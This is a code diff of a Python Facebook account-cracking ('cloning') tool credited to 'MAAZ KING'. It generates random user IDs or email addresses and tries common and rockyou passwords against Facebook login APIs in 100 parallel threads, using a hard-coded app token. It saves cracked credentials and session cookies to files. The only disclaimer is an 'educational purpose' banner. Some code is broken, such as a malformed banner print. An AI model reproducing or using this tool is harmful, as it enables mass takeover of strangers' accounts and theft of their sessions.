@@ -1,13 +1,7 @@
 #=====[🌿]CREATOR : MAAZ KING
-#=====[🌿]TELIGERM : @LabbaikSupport
+#=====[🌿]TELEGRAM : @LabbaikSupport
 
-import os
-import sys
-import json
-import uuid
-import string
-import random
-import requests
+import os, sys, json, uuid, string, random, requests
 from time import sleep
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
@@ -20,16 +14,16 @@ P = '\x1b[38;5;201m'
 W = '\x1b[0;97m'
 N = '\x1b[0m'
 
-class MAAZKING:
+class MAAZTOOL:
     def __init__(self):
         self.loop = 0
-        self.oks = []
-        self.cps = []
-        self.generated_ids = []
+        self.oks, self.cps, self.generated_ids = [], [], []
+        self.chunk_size = 5000
+        self.rockyou_path = os.path.expanduser("~/rockyou.txt")
+        self.wordlist = self.load_passwords()
 
     def banner(self):
         os.system("clear")
-        os.system("xdg-open https://facebook.com/groups/1036123894351028/")
         print(f"""{G}
 ███████╗ █████╗ ███████╗███████╗
 ██╔════╝██╔══██╗╚══███╔╝██╔════╝
@@ -37,166 +31,160 @@ class MAAZKING:
 ██╔══╝  ██╔══██║ ███╔╝  ██╔══╝  
 ██║     ██║  ██║███████╗███████╗
 ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
-""")
-        print(f"""{G}
 ╔══════════════════════════════════╗
 ║ • Creator  : MAAZ KING           ║
 ║ • Tools    : MAAZ TOOL           ║
 ║ • Version  : v2.0                ║
 ║ • Status   : Free                ║
-╚══════════════════════════════════╝{N}
-""")
+╚══════════════════════════════════╝{N}")
         print(f"{W}USE AT YOUR OWN RISK | EDUCATIONAL PURPOSE ONLY\n{N}")
 
-    def Main(self):
+    def menu(self):
         self.banner()
-        code = input(f"{Y}ENTER SIM CODE ➤ {G}")
-        try:
-            limit = int(input(f"{Y}ENTER ID LIMIT ➤ {G}"))
-        except ValueError:
-            print(f"{R}LIMIT MUST BE A NUMBER{N}")
-            return
+        print(f"""
+{G}[1]  Random Method
+[2]  Business Method
+[3]  Combo Method
+[4]  Dump Method
+[5]  Series Method
+""")
+        choice = input(f"{Y}Select Option ➤ {G}")
+        if choice == '1': self.random_method()
+        elif choice == '2': self.business_method()
+        elif choice == '3': self.combo_method()
+        elif choice == '4': self.dump_method()
+        elif choice == '5': self.series_method()
+        else:
+            print(f"{R}Invalid choice.{N}"); sys.exit()
+
+    def series_method(self):
+        self.banner()
+        print(f"""
+{G}Select UID Series:
+[1] 100001
+[2] 100002
+[3] 100003
+[4] 100004
+[5] 100005
+""")
+        series_options = {'1': '100001', '2': '100002', '3': '100003', '4': '100004', '5': '100005'}
+        choice = input(f"{Y}Select Series ➤ {G}")
+        prefix = series_options.get(choice)
+        if not prefix:
+            print(f"{R}Invalid selection.{N}"); return
+
+        print(f"""
+{G}Select ID Limit:
+[1] 5000
+[2] 10000
+[3] 99999
+""")
+        limits = {'1': 5000, '2': 10000, '3': 99999}
+        limit_choice = input(f"{Y}Choose ➤ {G}")
+        limit = limits.get(limit_choice)
+        if not limit:
+            print(f"{R}Invalid limit.{N}"); return
+
         for _ in range(limit):
-            rand_id = ''.join(random.choices(string.digits, k=8))
-            self.generated_ids.append(code + rand_id)
+            rand = ''.join(random.choices(string.digits, k=7))
+            self.generated_ids.append(prefix + rand)
 
-        print(f"\n{B}STARTING CLONING... PLEASE WAIT{N}")
-        print(f"{B}USE FLIGHT MODE IF NO RESPONSE\n{'-'*40}{N}")
-        
-        with ThreadPool(max_workers=30) as pool:
+        print(f"{B}[✓] Cloning started with {limit} IDs... Please wait{N}")
+        self.start_cloning()
+
+    def random_method(self):
+        self.banner()
+        prefix = ''.join(random.choices(string.digits, k=5))
+        limit = int(input(f"{Y}Enter ID Limit ➤ {G}"))
+        for _ in range(limit):
+            uid = prefix + ''.join(random.choices(string.digits, k=7))
+            self.generated_ids.append(uid)
+        print(f"{B}[✓] Starting Random UID Cloning...{N}")
+        self.start_cloning()
+
+    def business_method(self):
+        self.banner()
+        domain = input(f"{Y}Enter Email Domain (e.g. gmail.com) ➤ {G}")
+        limit = int(input(f"{Y}Enter Combo Limit ➤ {G}"))
+        for _ in range(limit):
+            name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))
+            self.generated_ids.append(name + "@" + domain)
+        print(f"{B}[✓] Starting Business Email Cloning...{N}")
+        self.start_cloning()
+
+    def combo_method(self):
+        self.banner()
+        if not os.path.exists("combo.txt"):
+            print(f"{R}combo.txt not found!{N}"); return
+        with open("combo.txt") as f:
+            for line in f:
+                parts = line.strip().split("|")
+                if len(parts) == 2:
+                    uid, pw = parts
+                    self.api_crack(uid, [pw])
+
+    def dump_method(self):
+        self.banner()
+        print(f"{Y}This feature requires UID dumper integration (Coming Soon).{N}")
+
+    def start_cloning(self):
+        with ThreadPool(max_workers=100) as pool:
             for uid in self.generated_ids:
-                passwords = [
-                    uid, uid[:8], uid[:7], uid[:6],
-                    uid[-8:], uid[-7:], uid[-6:],
-                    "i love you", "ff lover"
-                ]
-                pool.submit(self.method, uid, passwords)
+                pwlist = self.smart_passwords(uid, self.wordlist)
+                pool.submit(self.api_crack, uid, pwlist)
+        self.summary()
 
-        print(f"\n{Y}{'-'*40}")
-        print(f"{G}CLONING FINISHED! OK: {len(self.oks)} | CP: {len(self.cps)}{N}")
-        print(f"{Y}CHECK /sdcard FOR RESULTS{N}")
+    def smart_passwords(self, uid, wordlist):
+        return list(set([
+            uid, uid[:6], uid[-6:], uid[-7:],
+            "786786", "123456", "pakistan", "iloveyou"
+        ] + wordlist[:5]))
 
-    def method(self, uid, passlist):
-        sys.stdout.write(f"\r{W}MAAZ-TOOL-XD {self.loop} | OK: {G}{len(self.oks)}{W} | CP: {Y}{len(self.cps)}{N} ")
+    def load_passwords(self):
+        if not os.path.exists(self.rockyou_path):
+            print(f"{R}rockyou.txt not found in home directory.{N}"); return []
+        with open(self.rockyou_path, "r", errors="ignore") as f:
+            return [line.strip() for line in f if line.strip()][:self.chunk_size]
+
+    def api_crack(self, uid, passlist):
+        sys.stdout.write(f"\r{W}MAAZ-TOOL {self.loop} | OK: {G}{len(self.oks)}{W} | CP: {Y}{len(self.cps)}{N} ")
         sys.stdout.flush()
-        try:
-            for pw in passlist:
+        for pw in passlist:
+            try:
+                session = requests.Session()
+                headers = {'User-Agent': self.get_ua()}
                 data = {
-                    'adid': str(uuid.uuid4()),
-                    'format': 'json',
-                    'device_id': str(uuid.uuid4()),
                     'email': uid,
                     'password': pw,
-                    'generate_analytics_claims': '1',
-                    'community_id': '',
-                    'cpl': 'true',
-                    'try_num': '1',
-                    'family_device_id': str(uuid.uuid4()),
-                    'credentials_type': 'password',
-                    'source': 'login',
-                    'error_detail_type': 'button_with_disabled',
-                    'enroll_misauth': 'false',
-                    'generate_session_cookies': '1',
-                    'generate_machine_id': '1',
-                    'currently_logged_in_userid': '0',
+                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                     'locale': 'en_US',
-                    'client_country_code': 'US',
-                    'fb_api_req_friendly_name': 'authenticate',
-                    'api_key': '882a8490361da98702bf97a021ddc14d',
-                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                    'format': 'json'
                 }
-                headers = {
-                    'User-Agent': best_redmi_ua(),
-                    'Accept-Encoding': 'gzip, deflate',
-                    'Connection': 'close',
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Host': 'graph.facebook.com',
-                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                    'X-FB-Connection-Type': 'MOBILE.LTE',
-                    'X-Tigon-Is-Retry': 'False',
-                    'x-fb-session-id': 'nid=random;pid=Main;',
-                    'x-fb-device-group': '5120',
-                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                    'X-FB-Request-Analytics-Tags': 'graphservice',
-                    'X-FB-HTTP-Engine': 'Liger',
-                    'X-FB-Client-IP': 'True',
-                    'X-FB-Server-Cluster': 'True',
-                    'x-fb-connection-token': 'random-token'
-                }
-                url = "https://api.facebook.com/auth/login"
-                response = requests.post(url, data=data, headers=headers).json()
-
-                if "access_token" in response:
-                    uid_logged = str(response.get("uid", uid))
-                    year = get_year_from_uid(uid_logged)
-                    coki = ";".join(i["name"] + "=" + i["value"] for i in response.get("session_cookies", []))
-                    print(f"\r{G}[MAAZ-TOOL-OK] {uid_logged} | {pw} | YEAR: {year}{N}")
-                    print(f"{P}COOKIE ➤ {coki}{N}")
-                    with open("/sdcard/MAAZ-TOOL-OK.txt", "a") as ok_file:
-                        ok_file.write(f"{uid_logged}|{pw}|YEAR: {year}|{coki}\n")
-                    self.oks.append(uid_logged)
+                r = session.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers).json()
+                if "access_token" in r:
+                    print(f"\r{G}[OK] {uid} | {pw}{N}")
+                    open("maaz-OLD.txt", "a").write(f"{uid}|{pw}\n")
+                    coki = r.get("session_cookies", [])
+                    if coki:
+                        cookie = ";".join(f"{c['name']}={c['value']}" for c in coki)
+                        open("maaz-COOKIE.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
+                    self.oks.append(uid)
                     break
-
-                elif "www.facebook.com" in response.get("error", {}).get("message", ""):
-                    print(f"\r{Y}[MAAZ-TOOL-CP] {uid} | {pw}{N}")
-                    with open("/sdcard/MAAZ-TOOL-CP.txt", "a") as cp_file:
-                        cp_file.write(f"{uid}|{pw}\n")
+                elif "www.facebook.com" in r.get("error_msg", ""):
+                    print(f"\r{Y}[CP] {uid} | {pw}{N}")
+                    open("maaz-CP.txt", "a").write(f"{uid}|{pw}\n")
                     self.cps.append(uid)
                     break
+            except: pass
+        self.loop += 1
 
-            self.loop += 1
-        except Exception:
-            pass
+    def summary(self):
+        print(f"\n{Y}{'-'*40}")
+        print(f"{G}CLONING FINISHED! OK: {len(self.oks)} | CP: {len(self.cps)}{N}")
+        print(f"{Y}Saved: maaz-OLD.txt | maaz-CP.txt | maaz-COOKIE.txt{N}")
 
-def get_year_from_uid(uid):
-    uid = str(uid)
-    if len(uid) == 15:
-        if uid[:5] in ["10000", "10001", "10002"]:
-            return "2008-2010"
-        elif uid[:5] in ["10003", "10004", "10005"]:
-            return "2011-2013"
-        elif uid[:5] in ["10006", "10007"]:
-            return "2014-2016"
-        elif uid[:5] in ["10008", "10009"]:
-            return "2017-2020"
-        else:
-            return "2021+"
-    elif len(uid) == 14:
-        return "2007-2008"
-    elif len(uid) == 13:
-        return "2006-2007"
-    else:
-        return "Unknown"
-
-def best_redmi_ua():
-    models = [
-        {"model": "Redmi Note 13", "code": "2312DRAABC", "android": "13", "res": (1080, 2400)},
-        {"model": "Redmi 12", "code": "23053RN02L", "android": "13", "res": (1080, 2460)},
-        {"model": "Redmi Note 11", "code": "2109119DG", "android": "13", "res": (1080, 2400)},
-        {"model": "Redmi Note 10", "code": "M2101K7AG", "android": "12", "res": (1080, 2400)},
-        {"model": "Redmi 10", "code": "21061119AG", "android": "11", "res": (1080, 2400)},
-        {"model": "Redmi 9", "code": "Lancelot", "android": "10", "res": (720, 1600)},
-        {"model": "Redmi Note 8", "code": "Ginkgo", "android": "10", "res": (1080, 2340)},
-        {"model": "Redmi Note 7", "code": "Lavender", "android": "10", "res": (1080, 2340)},
-        {"model": "Redmi Note 6 Pro", "code": "Tulip", "android": "9", "res": (1080, 2280)},
-        {"model": "Redmi 6", "code": "cereus", "android": "9", "res": (720, 1440)},
-    ]
-    return models
-
-    m = random.choice(models)
-    density = round(random.uniform(2.0, 3.5), 2)
-    w, h = m["res"]
-    return (
-        f"[FBAN/FB4A;FBAV/{random.randint(300, 450)}.0.0.{random.randint(1, 30)}.{random.randint(50, 150)};"
-        f"FBBV/{random.randint(200000000, 399999999)};"
-        f"FBDM={{density={density},width={w},height={h}}};"
-        f"FBLC/bn_BD;FBRV/{random.randint(200000000, 400000000)};FBCR/Grameenphone;FBMF/Xiaomi;"
-        f"FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{m['code']};"
-        f"FBSV/{m['android']};FBOP/1;FBCA/arm64-v8a;]"
-    )
+    def get_ua(self):
+        return f"Mozilla/5.0 (Linux; Android 13; Redmi Note 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.{random.randint(1000,5000)}.100 Mobile Safari/537.36"
 
 if __name__ == "__main__":
-    MAAZKING().Main()
-         
+    MAAZTOOL().menu()
